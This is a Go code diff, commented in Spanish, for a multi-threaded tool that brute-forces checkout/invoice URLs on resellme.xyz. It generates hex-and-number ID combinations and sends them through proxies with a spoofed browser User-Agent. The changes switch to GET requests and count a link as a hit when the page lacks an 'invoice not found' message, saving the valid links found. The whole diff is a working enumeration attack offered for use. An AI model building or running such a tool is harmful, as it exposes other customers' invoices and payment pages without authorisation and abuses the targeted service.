@@ -38,7 +38,6 @@ var (
     invalidCount int
     retries      int
     mu           sync.Mutex
-    stopFlag     bool // Por si queremos parar manualmente (opcional)
 )
 
 // Estructura para pasar trabajo al Worker
@@ -67,7 +66,7 @@ func main() {
     var wg sync.WaitGroup
 
     // 1. Lanzar Workers (Hilos de verificación)
-    numWorkers := 500 // Ajusta esto según tu potencia
+    numWorkers := 100 // Reducido un poco para evitar saturar la red descargando HTML, ajusta según tu conexión
     fmt.Printf("%s[*] Iniciando %d Workers de verificación...%s\n", ColorCyan, numWorkers, ColorReset)
     for i := 0; i < numWorkers; i++ {
         wg.Add(1)
@@ -80,14 +79,14 @@ func main() {
     // 3. Lanzar Interfaz de Usuario (Estadísticas en vivo)
     go uiManager(startTime)
 
-    // Esperar (El programa nunca termina solo debido al generador infinito)
-    wg.Wait() 
+    // Esperar
+    wg.Wait()
 }
 
 // --- GENERADOR DE LINKS (LÓGICA) ---
 func linkGenerator(jobs chan<- Job) {
     baseURL := "https://resellme.xyz/checkout/"
-    
+
     fmt.Printf("%s[*] Generando combinaciones y probando...%s\n", ColorCyan, ColorReset)
 
     currentNum := int64(1000000000000) // Empezar desde 1 billón
@@ -95,15 +94,16 @@ func linkGenerator(jobs chan<- Job) {
     for {
         // Generar ID2 (13 dígitos numéricos)
         id2 := fmt.Sprintf("%013d", currentNum)
-        
+
         // Generar ID1 (Hex)
-        id1 := randomHex(13) 
+        id1 := randomHex(13)
 
         fullLink := fmt.Sprintf("%s%s-%s", baseURL, id1, id2)
-        
+
         jobs <- Job{Link: fullLink}
-        
+
         currentNum++
+        // Reiniciar si pasa el límite (opcional, para bucle infinito)
         if currentNum > 1999999999999 {
             currentNum = 1000000000000
         }
@@ -131,19 +131,20 @@ func checkLink(link string, proxies []string) {
     }
 
     client := &http.Client{
-        Timeout:   8 * time.Second,
+        Timeout:   10 * time.Second, // Un poco más de tiempo para leer el body
         Transport: transport,
         CheckRedirect: func(req *http.Request, via []*http.Request) error {
             return http.ErrUseLastResponse
         },
     }
 
-    req, err := http.NewRequest("HEAD", link, nil)
+    // CAMBIO IMPORTANTE: Usamos GET para obtener el contenido HTML
+    req, err := http.NewRequest("GET", link, nil)
     if err != nil {
         return
     }
 
-    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/377.36")
     if appConfig.ApiKey != "" {
         req.Header.Set("Authorization", "Bearer "+appConfig.ApiKey)
     }
@@ -154,15 +155,29 @@ func checkLink(link string, proxies []string) {
         return
     }
     defer resp.Body.Close()
-    io.Copy(io.Discard, resp.Body)
 
+    // Leemos el cuerpo de la respuesta
+    bodyBytes, err := io.ReadAll(resp.Body)
+    if err != nil {
+        printResult(link, "RETRY", "Read Error")
+        return
+    }
+    bodyString := string(bodyBytes)
+
+    // LÓGICA DE FILTRADO POR CONTENIDO
     if resp.StatusCode == 200 {
-        printResult(link, "VALID", resp.Status)
-        saveHit(link)
+        // Si la página contiene el mensaje de error, es FALSO
+        if strings.Contains(bodyString, "Error factura no encontrada") {
+            printResult(link, "INVALID", "Factura no encontrada")
+        } else {
+            // Si es 200 y NO tiene el error, es un HIT
+            printResult(link, "VALID", "Checkout Activo")
+            saveHit(link)
+        }
     } else if resp.StatusCode == 404 {
         printResult(link, "INVALID", resp.Status)
     } else {
-        printResult(link, "RETRY", resp.Status) 
+        printResult(link, "RETRY", resp.Status)
     }
 }
 
@@ -170,12 +185,12 @@ func checkLink(link string, proxies []string) {
 func printResult(link, statusType, detail string) {
     mu.Lock()
     defer mu.Unlock()
-    
+
     if statusType == "VALID" {
         validCount++
-        fmt.Printf("%s[VALID] %s - %s%s\n", ColorGreen, detail, link, ColorReset)
+        fmt.Printf("\n%s[VALID] %s - %s%s\n", ColorGreen, detail, link, ColorReset)
     } else if statusType == "RETRY" {
-        // opcional: fmt.Printf("%s[RETRY] %s%s\n", ColorYellow, detail, ColorReset)
+        // Los reintentos no se imprimen para no llenar la consola, pero se contabilizan si quieres
     } else {
         invalidCount++
     }
@@ -186,12 +201,13 @@ func uiManager(startTime time.Time) {
         time.Sleep(1 * time.Second)
         elapsed := time.Since(startTime).Truncate(time.Second)
         mu.Lock()
-        rate := float64(validCount+invalidCount) / elapsed.Seconds()
+        totalChecks := validCount + invalidCount
+        rate := float64(totalChecks) / elapsed.Seconds()
         mu.Unlock()
-        
-        fmt.Printf("\r%s[%s] Checks: %d | %sVALIDOS: %d%s | %sInvalidos: %d%s | Speed: %.0f/s%s", 
-            ColorWhite, elapsed, 
-            validCount+invalidCount, 
+
+        fmt.Printf("\r%s[%s] Checks: %d | %sVALIDOS: %d%s | %sInvalidos: %d%s | Speed: %.0f/s%s",
+            ColorWhite, elapsed,
+            totalChecks,
             ColorGreen, validCount, ColorReset,
             ColorRed, invalidCount, ColorReset,
             rate, ColorReset)
